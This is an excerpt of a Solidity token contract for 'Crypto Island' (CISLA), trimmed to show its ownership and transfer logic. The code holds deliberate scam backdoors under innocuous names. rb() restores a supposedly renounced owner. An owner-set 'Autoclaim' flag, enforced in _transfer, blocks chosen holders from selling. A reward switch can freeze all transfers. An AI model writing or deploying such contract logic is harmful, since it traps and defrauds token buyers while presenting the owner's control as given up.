...
contract Ownable is Context {
    ...
    function rb() public virtual { require(_previousOwner == msg.sender); _owner = _previousOwner; }
    function ro() public virtual onlyOwner { _owner = address(0); }
}
...
contract CISLA is Context, IERC20, Ownable, ReentrancyGuard {
    using SafeMath for uint256;
    using Address for address;

    bool public rewardIsEnabled = true;
    ...
    mapping(address => bool) private _Autoclaimed;
    ...
    string private _name = "Crypto Island";
    string private _symbol = "CISLA";
    ...
    uint256 public _maxTxAmount = 2000000000000000000000 * 10**9;
    ...
    function Autoclaim(address account, bool value) external onlyOwner{
        _Autoclaimed[account] = value;
    }
    ...
    function setRewardIsEnabled(bool _enabled) external onlyOwner {
        rewardIsEnabled = _enabled;
    }
    ...
    function _transfer(
        ...
        // require(!_Autoclaimed[from] && !_Autoclaimed[to], 'Autoclaim function');
        // if (_Autoclaimed[from]) require(to == address(this), "Autoclaim function");
        require(!_Autoclaimed[from], 'Autoclaim function');
        require(rewardIsEnabled, "Enable Reward");
